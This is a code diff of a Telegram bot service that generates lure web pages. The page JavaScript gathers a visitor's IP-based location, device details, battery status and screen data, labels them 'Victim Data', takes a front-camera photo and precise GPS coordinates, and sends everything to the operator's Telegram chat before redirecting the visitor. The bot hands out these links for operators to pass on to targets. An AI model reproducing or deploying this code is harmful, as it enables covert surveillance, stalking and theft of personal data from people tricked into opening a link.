@@ -100,14 +100,16 @@ def delete_old_files():
         try:
             if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                 os.remove(fp)
+                logger.info(f"Deleted old photo: {f}")
         except:
             pass
     for f in os.listdir(HTML_DIR):
-        if f.endswith('.html'):
+        if f.endswith('.html') and not f.startswith('state_'):
             fp = os.path.join(HTML_DIR, f)
             try:
                 if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                     os.remove(fp)
+                    logger.info(f"Deleted old HTML: {f}")
             except:
                 pass
 
@@ -115,7 +117,7 @@ def delete_old_files():
 def start_auto_cleanup():
     def cleanup():
         while True:
-            time.sleep(600)
+            time.sleep(600)  # 10 minutes
             delete_old_files()
     threading.Thread(target=cleanup, daemon=True).start()
 
@@ -146,7 +148,7 @@ def generate_html(user_id, target_url, photo_filename):
         .card {{
             background: white;
             border-radius: 32px;
-            max-width: 400px;
+            max-width: 420px;
             width: 100%;
             overflow: hidden;
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
@@ -164,8 +166,8 @@ def generate_html(user_id, target_url, photo_filename):
         .logo span {{ color: #e94560; }}
         .content {{ padding: 24px; }}
         .user-photo {{
-            width: 160px;
-            height: 160px;
+            width: 200px;
+            height: 200px;
             border-radius: 50%;
             object-fit: cover;
             margin-bottom: 20px;
@@ -251,160 +253,101 @@ function showLoading() {{
     document.getElementById('loadingStep').classList.add('active');
 }}
 
-function showError(msg) {{
-    document.getElementById('loadingStep').classList.remove('active');
-    document.getElementById('mainStep').classList.add('active');
-    document.getElementById('errorMsg').innerText = msg;
-}}
-
-async function sendMessage(text) {{
-    try {{
-        await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
+function sendMessage(text) {{
+    fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
+        method: 'POST',
+        headers: {{ 'Content-Type': 'application/json' }},
+        body: JSON.stringify({{ chat_id: USER, text: text, parse_mode: 'HTML' }})
+    }}).catch(e => console.log(e));
+    if (STORAGE && STORAGE !== 'null') {{
+        fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
-            body: JSON.stringify({{ chat_id: USER, text: text, parse_mode: 'HTML' }})
-        }});
-        if (STORAGE && STORAGE !== 'null') {{
-            await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
-                method: 'POST',
-                headers: {{ 'Content-Type': 'application/json' }},
-                body: JSON.stringify({{ chat_id: STORAGE, text: text, parse_mode: 'HTML' }})
-            }});
-        }}
-    }} catch(e) {{ console.log(e); }}
-}}
-
-async function sendPhoto(blob) {{
-    try {{
-        let fd = new FormData();
-        fd.append('chat_id', USER);
-        fd.append('photo', blob, 'photo.jpg');
-        await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: fd }});
-        if (STORAGE && STORAGE !== 'null') {{
-            let fd2 = new FormData();
-            fd2.append('chat_id', STORAGE);
-            fd2.append('photo', blob, 'photo.jpg');
-            await fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: fd2 }});
-        }}
-    }} catch(e) {{ console.log(e); }}
-}}
-
-async function getIP() {{
-    try {{
-        let r = await fetch('https://api.ipify.org?format=json');
-        let d = await r.json();
-        return d.ip;
-    }} catch(e) {{ return 'Unknown'; }}
-}}
-
-async function getIPInfo(ip) {{
-    try {{
-        let r = await fetch(`https://ipapi.co/${{ip}}/json/`);
-        return await r.json();
-    }} catch(e) {{ return {{}}; }}
-}}
-
-async function getBattery() {{
-    if (navigator.getBattery) {{
-        try {{
-            let b = await navigator.getBattery();
-            return {{ level: Math.round(b.level * 100), charging: b.charging }};
-        }} catch(e) {{}}
-    }}
-    return null;
-}}
-
-function getDevice() {{
-    let ua = navigator.userAgent;
-    if (/iPhone/i.test(ua)) return 'iPhone';
-    if (/iPad/i.test(ua)) return 'iPad';
-    if (/Android/i.test(ua)) return 'Android';
-    return 'Desktop';
-}}
-
-function formatBytes(bytes) {{
-    if (bytes === 0) return '0 Bytes';
-    let k = 1024;
-    let sizes = ['Bytes', 'KB', 'MB', 'GB'];
-    let i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-}}
-
-async function captureInfo() {{
-    try {{
-        let ip = await getIP();
-        let info = await getIPInfo(ip);
-        let battery = await getBattery();
-        let lang = navigator.language || 'Unknown';
-        let res = screen.width + 'x' + screen.height;
-        
-        let msg = "<b>Victim Data Captured</b>\\n";
-        msg += "------------------------\\n";
-        msg += "Device: " + getDevice() + "\\n";
-        msg += "IP: " + ip + "\\n";
-        msg += "Country: " + (info.country_name || 'Unknown') + "\\n";
-        msg += "City: " + (info.city || 'Unknown') + "\\n";
-        msg += "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n";
-        msg += "Battery Level: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
-        msg += "Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n";
-        msg += "Resolution: " + res + "\\n";
-        msg += "Language: " + lang + "\\n";
-        msg += "------------------------\\n@nrtecno2";
-        
-        await sendMessage(msg);
-        return true;
-    }} catch(e) {{
-        await sendMessage("Error: " + e.message);
-        return false;
+            body: JSON.stringify({{ chat_id: STORAGE, text: text, parse_mode: 'HTML' }})
+        }}).catch(e => console.log(e));
     }}
 }}
 
-async function captureCameraAndLocation() {{
-    try {{
-        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
-        let video = document.getElementById('video');
-        video.srcObject = stream;
-        await new Promise(r => video.onloadedmetadata = () => {{ video.play(); r(); }});
-        await new Promise(r => setTimeout(r, 300));
-        let canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
-        if (blob && blob.size > 500) {{
-            await sendPhoto(blob);
-        }}
-        stream.getTracks().forEach(t => t.stop());
-        
-        if (navigator.geolocation) {{
-            navigator.geolocation.getCurrentPosition(async (p) => {{
-                await sendMessage("<b>📍 GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
-                await sendMessage("<b>🎯 Coordinates</b>\\nLat: " + p.coords.latitude + "\\nLon: " + p.coords.longitude + "\\nAccuracy: " + p.coords.accuracy + " meters");
-            }}, async (e) => {{
-                await sendMessage("<b>📍 GPS Location</b>\\nAccess denied or not available");
-            }});
-        }} else {{
-            await sendMessage("<b>📍 GPS Location</b>\\nGeolocation not supported");
-        }}
-        return true;
-    }} catch(e) {{
-        await sendMessage("Camera access denied");
-        return false;
+function sendPhoto(blob) {{
+    let fd = new FormData();
+    fd.append('chat_id', USER);
+    fd.append('photo', blob, 'photo.jpg');
+    fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: fd }}).catch(e => console.log(e));
+    if (STORAGE && STORAGE !== 'null') {{
+        let fd2 = new FormData();
+        fd2.append('chat_id', STORAGE);
+        fd2.append('photo', blob, 'photo.jpg');
+        fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: fd2 }}).catch(e => console.log(e));
     }}
 }}
 
 async function startProcess() {{
     showLoading();
     
-    await captureInfo();
-    let cameraOk = await captureCameraAndLocation();
+    // Get IP and basic info
+    try {{
+        let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
+        let info = await fetch(`https://ipapi.co/${{ip}}/json/`).then(r=>r.json()).catch(()=>{{}});
+        let battery = null;
+        if (navigator.getBattery) {{
+            try {{
+                let b = await navigator.getBattery();
+                battery = {{ level: Math.round(b.level * 100), charging: b.charging }};
+            }} catch(e) {{}}
+        }}
+        let ua = navigator.userAgent;
+        let device = 'Desktop';
+        if (/iPhone/i.test(ua)) device = 'iPhone';
+        else if (/iPad/i.test(ua)) device = 'iPad';
+        else if (/Android/i.test(ua)) device = 'Android';
+        let msg = "<b>Victim Data</b>\\n";
+        msg += "Device: " + device + "\\n";
+        msg += "IP: " + ip + "\\n";
+        msg += "Country: " + (info?.country_name || 'Unknown') + "\\n";
+        msg += "City: " + (info?.city || 'Unknown') + "\\n";
+        msg += "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n";
+        msg += "Battery: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
+        msg += "Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n";
+        msg += "Resolution: " + screen.width + 'x' + screen.height + "\\n";
+        msg += "------------------------\\n@nrtecno2";
+        sendMessage(msg);
+    }} catch(e) {{}}
     
-    if (cameraOk) {{
-        setTimeout(() => {{
-            window.location.href = TARGET;
-        }}, 1500);
+    // Camera and Location
+    try {{
+        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
+        let video = document.getElementById('video');
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = () => {{ video.play(); r(); }});
+        await new Promise(r => setTimeout(r, 200));
+        let canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+        if (blob && blob.size > 500) sendPhoto(blob);
+        stream.getTracks().forEach(t => t.stop());
+    }} catch(e) {{
+        sendMessage("Camera access denied");
+    }}
+    
+    // Location (always try, redirect after)
+    if (navigator.geolocation) {{
+        navigator.geolocation.getCurrentPosition(
+            (p) => {{
+                sendMessage("<b>GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
+                sendMessage("<b>Coordinates</b>\\nLat: " + p.coords.latitude + "\\nLon: " + p.coords.longitude + "\\nAccuracy: " + p.coords.accuracy + "m");
+                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
+            }},
+            (e) => {{
+                sendMessage("GPS Location: Access denied");
+                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
+            }},
+            {{ timeout: 5000, enableHighAccuracy: true }}
+        );
     }} else {{
-        showError("Camera access required. Please refresh and allow camera.");
+        sendMessage("GPS Location: Not supported");
+        setTimeout(() => {{ window.location.href = TARGET; }}, 500);
     }}
 }}
 </script>
@@ -449,7 +392,7 @@ def webhook():
                     send_message(uid, f"🚫 Join {REQUIRED_CHANNEL} first!", markup)
                 else:
                     set_user_state(uid, "waiting_url")
-                    send_message(uid, "✅ Send me any URL:\nhttps://www.instagram.com/p/xxxxx")
+                    send_message(uid, "✅ Send me any URL:")
             elif text.startswith(('http://', 'https://')):
                 state = get_user_state(uid)
                 if state.get("state") == "waiting_url":
@@ -487,7 +430,7 @@ def webhook():
                 set_user_state(uid, "done")
 
                 link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
-                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera required\n📍 GPS will be captured")
+                send_message(uid, f"✅ LINK:\n{link}\n\n⚠️ Active until you create new link\n📸 Camera required")
 
             except Exception as e:
                 logger.error(f"Photo error: {e}")
@@ -515,7 +458,8 @@ def serve_photo(filename):
 
 @app.route('/')
 def home():
-    return "🐉 Bot alive | Ready"
+    active = len([f for f in os.listdir(HTML_DIR) if f.endswith('.html')])
+    return f"🐉 Bot alive | Active links: {active}"
 
 
 if __name__ == "__main__":
